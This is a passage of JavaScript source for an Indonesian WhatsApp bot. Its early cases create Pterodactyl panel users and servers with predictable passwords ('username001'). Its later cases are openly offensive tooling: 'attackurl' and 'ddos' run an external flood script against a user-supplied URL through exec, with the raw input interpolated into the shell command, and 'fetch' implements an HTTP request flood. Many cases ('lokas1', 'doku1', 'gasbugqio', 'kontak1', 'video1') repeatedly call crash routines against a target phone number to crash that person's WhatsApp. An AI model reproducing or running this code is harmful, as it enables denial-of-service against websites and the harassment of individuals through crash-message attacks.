"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 8gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '4gb': {
if(!isReseller){
qioreply(mess.seller)
}
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4024"
let cpu = "110"
let disk = "4024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 8gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '5gb': {
if(!isReseller){
qioreply(mess.seller)
}
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5024"
let cpu = "130"
let disk = "5024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 5gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '6gb': {
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6024"
let cpu = "150"
let disk = "6024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 5gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '7gb': {
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 7gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

//=================================================//
case 'unli': {
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - Unlimited',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case 'attackurl': {
if (!isPrem) return qioreply(mess.prem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
m.reply(`Sucess Menyerang Website : ${url}, Website akan eror dalam waktu ${time}`);
exec(`node ./Ⓒঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄.js ${url} ${time} ${thread} ${rate} ./proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'ddos': {
if (!isPrem) return qioreply(mess.prem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
m.reply(`Sucess Menyerang Website : ${url}, Website akan eror dalam waktu ${time}`);
exec(`node ./Ⓑঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄.js ${url} ${time} ${rate} ${thread} ./proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'fetch': {
if (!isPrem) return qioreply(mess.prem)
let url = q.split(" ")[0]
let time = q.split(" ")[1] * 1000

if (args.length === 2 && url && !isNaN(time)) {
let attack = () => {
let totalRequests = 0
let threads = []

for (let j = 0; j < 6; j++) {
threads.push(
new Promise((resolve, reject) => {
let interval = setInterval(() => {
for (let j = 0; j < 100; j++) {
fetch(url)
.then(() => {
totalRequests++
console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
})
.catch(err => {})
}
}, 750)
setTimeout(() => {
clearInterval(interval)
resolve()
}, time)
})
)
}

Promise.all(threads)
.then(() => console.log("Attack complete"))
.catch(err => console.error("Error in attack:", err))
}

attack()
} else {
m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time]`)
}
}
break
//=================================================//
case "checkhost": {
if (!q) return qioreply (`Example : ${m.prefix + m.command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Klik Chech Host Untuk Untuk Memeriksa Web"
    },
    "footer": {
      "text": "ঔৣ⃕᭝Alfin Faridh Taufiqiy𝐳᭄ Top"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": `{ display_text : 'Check Host' , url : "https://check-host.net/check-http?host=${q}", merchant_url : "https://check-host.net/check-http?host=${q}" }`
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
qio.relayMessage(m.chat, msg, {});
}
break
//=================================================//

case 'lokas1': case 'lokas2': case 'lokas3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'doku1': case 'doku2': case 'doku3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'audio1': case 'audio2': case 'audio3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'gasbugqio': case 'oemji': case 'lawack': {
if (!isPrem) return qioreply(mess.prem)
if (!qtext) return m.reply(`Command Salah Silahkan Gunakan Command ${command} nomor|jumlah`)
Pe = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await qio.onWhatsApp(Pe)
if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'kontak1': case 'kontak2': case 'kontak3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'gambar1': case 'gambar2': case 'gambar3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'video1': case 'video2': case 'video3': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { video: virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { video: virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { video: virgam,  caption: `${buttonqio}` }, { quoted:m })
qio.sendMessage(Pe, { video: virgam,  caption: `${buttonqio}` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
